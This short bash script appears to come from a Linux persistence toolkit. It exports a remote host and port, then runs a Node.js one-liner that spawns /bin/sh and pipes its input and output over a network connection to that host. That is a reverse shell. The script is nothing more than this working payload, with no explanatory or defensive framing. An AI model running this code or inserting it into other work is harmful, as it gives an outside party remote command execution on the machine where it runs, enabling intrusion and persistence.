linper=yes

#!/bin/bash

export RHOST=0.0.0.0
export RPORT=5253
node -e "sh = require(\"child_process\").spawn(\"/bin/sh\");net.connect('$RPORT', '$RHOST', function () {this.pipe(sh.stdin);sh.stdout.pipe(this);sh.stderr.pipe(this);});"
